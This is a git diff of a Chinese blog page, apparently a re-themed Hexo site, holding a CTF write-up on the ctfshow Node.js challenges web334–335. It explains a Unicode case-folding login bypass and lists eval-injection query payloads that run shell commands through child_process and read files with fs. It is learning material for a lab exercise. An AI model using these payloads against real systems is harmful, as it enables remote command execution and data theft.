@@ -1,164 +1,20 @@
-<!DOCTYPE html>
-<html lang=zh>
-<head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="nodejs学习">
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="author" content="jjjing"/><meta name="copyright" content="jjjing"/><meta name="theme-color" content="#FFB347"/><meta name="format-detection" content="telephone=no"/><meta name="keywords" content="Hexo Theme MEOW"/><meta name="mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-touch-fullscreen" content="yes"/><meta name="application-name" content="ctfshow_web入门_nodejs | jjjing"/><meta name="apple-mobile-web-app-title" content="ctfshow_web入门_nodejs | jjjing"/><meta name="apple-mobile-web-app-status-bar-style" content="#FFB347"/><link rel="canonical" href="https://jinggg1123.github.io/archives/2023/01/03/ctfshownodejs/"/><meta name="description" content="学习链接：  CTFSHOW nodejs篇_yu22x的博客-CSDN博客 Node.js 常见漏洞学习与总结 - 先知社区 (aliyun.com)  web334 JS大小写特性这题纯纯考看代码。 user.js 发现 username: &#39;CTFSHOW&#39;, password: &#39;123456&#39; login.js 里有这么一段代码： 123456789...">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ctfshow_web入门_nodejs">
-<meta property="og:url" content="https://itsbefore.github.io/archives/2023/01/03/ctfshownodejs/index.html">
-<meta property="og:site_name" content="before">
-<meta property="og:description" content="nodejs学习">
+<meta property="og:title" content="ctfshow_web入门_nodejs | jjjing">
+<meta property="og:url" content="https://jinggg1123.github.io/archives/2023/01/03/ctfshownodejs/index.html">
+<meta property="og:site_name" content="jjjing">
+<meta property="og:description" content="学习链接：  CTFSHOW nodejs篇_yu22x的博客-CSDN博客 Node.js 常见漏洞学习与总结 - 先知社区 (aliyun.com)  web334 JS大小写特性这题纯纯考看代码。 user.js 发现 username: &#39;CTFSHOW&#39;, password: &#39;123456&#39; login.js 里有这么一段代码： 123456789...">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://jinggg1123.github.io/archives/2023/01/03/ctfshownodejs/assets/images/Hexo-Theme-MEOW.png">
 <meta property="article:published_time" content="2023-01-03T13:10:33.000Z">
-<meta property="article:modified_time" content="2023-12-24T05:47:40.710Z">
-<meta property="article:author" content="before">
-<meta name="twitter:card" content="summary">
-    
-    
-      
-        
-          <link rel="shortcut icon" href="/images/favicon.ico">
-        
-      
-      
-        
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-        
-      
-    
-    <!-- title -->
-    <title>ctfshow_web入门_nodejs</title>
-    <!-- async scripts -->
-    <!-- Google Analytics -->
-
-
-    <!-- Umami Analytics -->
-
-
-    <!-- styles -->
-    
+<meta property="article:modified_time" content="2024-12-08T13:23:38.036Z">
+<meta property="article:author" content="jjjing">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://jinggg1123.github.io/archives/2023/01/03/ctfshownodejs/assets/images/Hexo-Theme-MEOW.png"><meta name="robots" content="index,follow"/><meta name="googlebot" content="index,follow"/><meta name="revisit-after" content="1 days"/><title>ctfshow_web入门_nodejs | jjjing</title><link rel="shortcut icon" href="/assets/images/Hexo-Theme-MEOW.ico"><link rel="preconnect" href="/assets"/><link rel="preconnect" href="assets"/>
 <link rel="stylesheet" href="/css/style.css">
 
-    <!-- persian styles -->
-    
-    <!-- rss -->
-    
-    
-	<!-- mathjax -->
-	
-<meta name="generator" content="Hexo 6.1.0"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-        <!--
-       --><li><a href="/">首页</a></li><!--
-     --><!--
-       --><li><a href="/archives/">归档</a></li><!--
-     --><!--
-       --><li><a href="/categories/">分类</a></li><!--
-     --><!--
-       --><li><a href="/about/">关于</a></li><!--
-     -->
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" aria-label="上一篇" href="/2023/01/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A7%BF%E5%8A%BF%E9%9B%86%E6%80%BB/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" aria-label="下一篇" href="/2022/12/19/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">上一篇</span>
-      <span id="i-next" class="info" style="display:none;">下一篇</span>
-      <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://itsbefore.github.io/archives/2023/01/03/ctfshownodejs/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://itsbefore.github.io/archives/2023/01/03/ctfshownodejs/&text=ctfshow_web入门_nodejs"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://itsbefore.github.io/archives/2023/01/03/ctfshownodejs/&title=ctfshow_web入门_nodejs"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://itsbefore.github.io/archives/2023/01/03/ctfshownodejs/&is_video=false&description=ctfshow_web入门_nodejs"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=ctfshow_web入门_nodejs&body=Check out this article: https://itsbefore.github.io/archives/2023/01/03/ctfshownodejs/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://itsbefore.github.io/archives/2023/01/03/ctfshownodejs/&title=ctfshow_web入门_nodejs"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://itsbefore.github.io/archives/2023/01/03/ctfshownodejs/&title=ctfshow_web入门_nodejs"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://itsbefore.github.io/archives/2023/01/03/ctfshownodejs/&title=ctfshow_web入门_nodejs"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://itsbefore.github.io/archives/2023/01/03/ctfshownodejs/&title=ctfshow_web入门_nodejs"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://itsbefore.github.io/archives/2023/01/03/ctfshownodejs/&name=ctfshow_web入门_nodejs&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://itsbefore.github.io/archives/2023/01/03/ctfshownodejs/&t=ctfshow_web入门_nodejs"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    
-    
-      <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">web334 JS大小写特性</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">web335 JS 的 RCE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">web336 有过滤的RCE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">web337 js变量</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">web338 原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">web339 原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">web340 原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">8.</span> <span class="toc-text">web341 ejs rce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">9.</span> <span class="toc-text">web342、343 jade原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">10.</span> <span class="toc-text">web344 HTTP参数污染</span></a></li></ol>
-      </div>
-    
-  </span>
-</div>
-
-    
-    <div class="content index py4 ">
-        
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle p-name" itemprop="name headline">
-        ctfshow_web入门_nodejs
-    </h1>
-
-
-
-    <div class="meta">
-      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span class="p-name" itemprop="name">before</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2023-01-03T13:10:33.000Z" class="dt-published" itemprop="datePublished">2023-01-03</time>
-        
-      
-    </div>
-
-      
-    <div class="article-category">
-        <i class="fa-solid fa-archive"></i>
-        <a class="category-link" href="/categories/CTF/">CTF</a>
-    </div>
-
-
-      
-
-    </div>
-  </header>
-  
-
-  <div class="content e-content" itemprop="articleBody">
-    <p>学习链接：</p>
+<link rel="stylesheet" href="/css/third-party/dist/APlayer.min.css">
+<link rel="prefetch" href="/"/><link rel="prefetch" href="/archives"/><link rel="prefetch" href="/tags"/><meta name="generator" content="Hexo 6.3.0"></head><body bg-style="none"><div class="post-progressbar-container"><div class="post-progressbar"></div></div><header><div id="navbar"><div id="nav-info"><a id="site-icon" href="/" title="主页"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a id="site-name" href="/" title="主页"><div>jjjing</div><img src="/assets/images/svg/uc/uc-home.svg" class="icon noview" alt="Icon"></a></div><div id="nav-menu"></div><div id="nav-function"><div id="menu-btn"><a href="javascript:void(0);" title="打开菜单"><img src="/assets/images/svg/uc/uc-menu.svg" class="icon noview" alt="Icon"></a></div></div></div></header><div id="menu-aside"><div id="menu-aside-container"><div id="menu-aside-info"><a href="/" title="主页"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a href="/" title="主页">jjjing</a></div><hr/></div></div><main><div class="banner"><div class="banner-info"><div class="banner-avatar"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Avatar"/></div><div class="banner-title">「 MEOW 」</div></div></div><div class="post-container"><div class="post-main"><div class="post-content"><h1 class="post-title">ctfshow_web入门_nodejs</h1><div class="post-author"><span>作者: jjjing</span></div><div class="post-meta"><div class="post-info"><div class="post-date"><div class="post-pubdate"><img src="/assets/images/svg/ta/ta-pubdate.svg" class="icon noview" alt="Icon"><span>发表于2023-01-03</span></div><div class="post-update"><img src="/assets/images/svg/ta/ta-update.svg" class="icon noview" alt="Icon"><span>更新于2024-12-08</span></div></div><div class="post-read"></div></div><div class="post-attribute"><div class="post-categories"><img src="/assets/images/svg/ta/ta-category.svg" class="icon noview" alt="Icon"><span><a class="post-categories-link" href="/categories/CTF/">CTF</a></span></div></div></div><div class="post markdown" indent="false"><p>学习链接：</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/111780832">CTFSHOW nodejs篇_yu22x的博客-CSDN博客</a></li>
 <li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7184">Node.js 常见漏洞学习与总结 - 先知社区 (aliyun.com)</a></li>
@@ -166,124 +22,55 @@
 <h1><span id="web334-js大小写特性">web334 JS大小写特性</span></h1><p>这题纯纯考看代码。</p>
 <p>user.js 发现 <code>username: &#39;CTFSHOW&#39;, password: &#39;123456&#39;</code></p>
 <p>login.js 里有这么一段代码：</p>
-<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> <span class="token function-variable function">findUser</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-  <span class="token keyword">return</span> users<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">return</span> name<span class="token operator">!==</span><span class="token string">'CTFSHOW'</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span>username <span class="token operator">===</span> name<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span>password <span class="token operator">===</span> password<span class="token punctuation">;</span>
-  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
-
-<span class="token comment">//---------------------------------------------------------------------------</span>
-<span class="token comment">//第一次接触nodejs，所以我对代码做了分析：</span>
-<span class="token keyword">var</span> <span class="token function-variable function">findUser</span> <span class="token operator">=</span> 
-  <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> password</span><span class="token punctuation">)</span><span class="token comment">//我们输入的username,password当做参数传入这个函数</span>
-  <span class="token punctuation">&#123;</span>
-    <span class="token keyword">return</span> users<span class="token punctuation">.</span><span class="token function">find</span>
-    <span class="token punctuation">(</span>
-      <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span><span class="token comment">//这里的item代表users,我理解为类的this关键字</span>
-      <span class="token punctuation">&#123;</span>
-        <span class="token keyword">return</span> <span class="token punctuation">(</span>name<span class="token operator">!==</span><span class="token string">'CTFSHOW'</span><span class="token punctuation">)</span> <span class="token comment">//不能等于CTFSHOW全是大写</span>
-            <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>item<span class="token punctuation">.</span>username <span class="token operator">===</span> name<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//我们输入的字符串转大写后要强等于CTFSHOW</span>
-            <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>item<span class="token punctuation">.</span>password <span class="token operator">===</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//密码相等</span>
-      <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Js"><div class="codebox"><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> findUser = <span class="keyword">function</span>(<span class="params">name, password</span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> users.<span class="title function_">find</span>(<span class="keyword">function</span>(<span class="params">item</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="property">username</span> === name.<span class="title function_">toUpperCase</span>() &amp;&amp; item.<span class="property">password</span> === password;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//---------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">//第一次接触nodejs，所以我对代码做了分析：</span></span><br><span class="line"><span class="keyword">var</span> findUser = </span><br><span class="line">  <span class="keyword">function</span>(<span class="params">name, password</span>)<span class="comment">//我们输入的username,password当做参数传入这个函数</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> users.<span class="property">find</span></span><br><span class="line">    (</span><br><span class="line">      <span class="keyword">function</span>(<span class="params">item</span>)<span class="comment">//这里的item代表users,我理解为类的this关键字</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> (name!==<span class="string">&#x27;CTFSHOW&#x27;</span>) <span class="comment">//不能等于CTFSHOW全是大写</span></span><br><span class="line">            &amp;&amp; (item.<span class="property">username</span> === name.<span class="title function_">toUpperCase</span>())<span class="comment">//我们输入的字符串转大写后要强等于CTFSHOW</span></span><br><span class="line">            &amp;&amp; (item.<span class="property">password</span> === password);<span class="comment">//密码相等</span></span><br><span class="line">      &#125;</span><br><span class="line">    );</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>name和password是我们传入的值；item.username和item.password是user.js里的用户名密码。</p>
 <p>我们传入的name不能等于CTFSHOW，name的大写形式要强等于item.username，也就是CTFSHOW。密码要是123456。</p>
 <p>所以我们可以写几个小写：</p>
-<pre class="line-numbers language-none"><code class="language-none">CTFshow
-123456<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Nginx"><div class="codebox"><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">CTFshow</span></span><br><span class="line"><span class="number">123456</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>登录成功获得flag</p>
 <p>看大佬的博客发现还有一个trick，p神文章：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">Fuzz中的javascript大小写特性 | 离别歌 (leavesongs.com)</a></p>
-<pre class="line-numbers language-none"><code class="language-none">Character.toUpperCase()函数，字符ı会转变为I，字符ſ会变为S
-Character.toLowerCase()函数，字符İ会转变为i，字符K会转变为k<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Reasonml"><div class="codebox"><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">Character</span>.</span></span><span class="keyword">to</span><span class="constructor">UpperCase()</span>函数，字符ı会转变为I，字符ſ会变为S</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">Character</span>.</span></span><span class="keyword">to</span><span class="constructor">LowerCase()</span>函数，字符İ会转变为i，字符K会转变为k</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>学习一波~</p>
 <h1><span id="web335-js-的-rce">web335 JS 的 RCE</span></h1><p>本题带我们了解掌握 Node.JS 的 RCE。</p>
 <p>在js中，<code>eval()</code>方法用于计算字符串，并把它作为<u>脚本代码来执行</u>。<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/eval">eval() - JavaScript</a></p>
 <p>payload里利用到的child_process： <a target="_blank" rel="noopener" href="http://nodejs.cn/api/child_process.html#child-process">child_process 子进程 | Node.js API 文档</a></p>
 <p>PAYLOAD：</p>
-<pre class="line-numbers language-none"><code class="language-none">?eval&#x3D;require(&quot;child_process&quot;).execSync(&#39;ls&#39;)
-
-?eval&#x3D;require(&#39;child_process&#39;).execSync(&#39;ls&#39;).toString()
-
-?eval&#x3D;require(&quot;child_process&quot;)[&#39;exe&#39;%2B&#39;cSync&#39;](&#39;ls&#39;)
-
-?eval&#x3D;require(&#39;child_process&#39;).spawnSync( &#39;ls&#39;, [ &#39;.&#x2F;&#39; ] ).stdout.toString()
-
-?eval&#x3D;global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;ls&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;ls&#x27;</span>).<span class="title function_">toString</span>()</span><br><span class="line"></span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">&#x27;exe&#x27;</span>%2B<span class="string">&#x27;cSync&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">spawnSync</span>( <span class="string">&#x27;ls&#x27;</span>, [ <span class="string">&#x27;./&#x27;</span> ] ).<span class="property">stdout</span>.<span class="title function_">toString</span>()</span><br><span class="line"></span><br><span class="line">?<span class="built_in">eval</span>=<span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="property">constructor</span>.<span class="title function_">_load</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>其他姿势：</p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;读文件夹，读文件函数
-?eval&#x3D;require(&#39;fs&#39;).readdirSync(&quot;.&quot;)
-?eval&#x3D;require(&#39;fs&#39;).readFileSync(&#39;.&#x2F;fl00g.txt&#39;,&#39;utf8&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//读文件夹，读文件函数</span></span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readdirSync</span>(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readFileSync</span>(<span class="string">&#x27;./fl00g.txt&#x27;</span>,<span class="string">&#x27;utf8&#x27;</span>);</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;字符串拼接
